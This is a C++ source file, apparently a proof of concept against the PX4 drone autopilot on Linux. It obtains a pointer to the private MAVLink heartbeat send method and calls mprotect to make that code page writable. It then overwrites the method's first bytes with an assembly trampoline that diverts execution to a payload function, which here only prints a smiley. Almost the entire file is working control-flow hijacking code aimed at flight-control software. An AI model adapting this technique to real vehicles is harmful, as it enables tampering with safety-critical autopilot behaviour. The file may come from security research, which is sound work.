#ifdef __PX4_LINUX
#include "exploit.h"
#include <iostream>
#include <unistd.h>
#include <sys/mman.h>
#include <errno.h>
#include <string.h>


using namespace std;


// This class is not in a .h file, so we need to copy its declaration here.
#include "mavlink_main.h"
#include <uORB/topics/vehicle_status.h>
#include <uORB/uORB.h>
class MavlinkStreamHeartbeat : public MavlinkStream
{
public:
	const char *get_name() const;
	static const char *get_name_static();
	static uint16_t get_id_static();
	uint16_t get_id();
	static MavlinkStream *new_instance(Mavlink *mavlink);
	unsigned get_size();
	bool const_rate();

private:
	MavlinkOrbSubscription *_status_sub;

	/* do not allow top copying this class */
	MavlinkStreamHeartbeat(MavlinkStreamHeartbeat &);
	MavlinkStreamHeartbeat &operator = (const MavlinkStreamHeartbeat &);

protected:
	explicit MavlinkStreamHeartbeat(Mavlink *mavlink) : MavlinkStream(mavlink),
		_status_sub(_mavlink->add_orb_subscription(ORB_ID(vehicle_status)))
	{}

	bool send(const hrt_abstime t);
};


extern void payload() asm("asmfunc");

void payload()
{
	cout << "***** :-) ******" << endl;
}


asm("two:              \n\
    PUSH $asmfunc\n\
    RET\n\
");


extern "C" void two();

/**
 * Class to expose pointer to private method
 */
class Trick : public MavlinkStreamHeartbeat
{
public:
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wpmf-conversions"
	static void *getFuncPtr() { return (void *) &Trick::send; }
#pragma GCC diagnostic pop
};

static void exploit(void *fp);

void exploit(void *fp)
{
	unsigned char *p = (unsigned char *) fp;

	int pageSize = sysconf(_SC_PAGE_SIZE);
	void *pageStart = (void *)(((unsigned long) p / pageSize) * pageSize);

	// cout << "code start " << (void *) p << ", page start " << pageStart << endl;

	if (mprotect(pageStart, pageSize, PROT_READ | PROT_WRITE | PROT_EXEC) == -1) {
		cout << "mprotect error: " << strerror(errno) << endl;
		return;
	}

	memcpy(p, (const void *)two, 10);
}

void exploit()
{
	exploit(Trick::getFuncPtr());
}

#endif
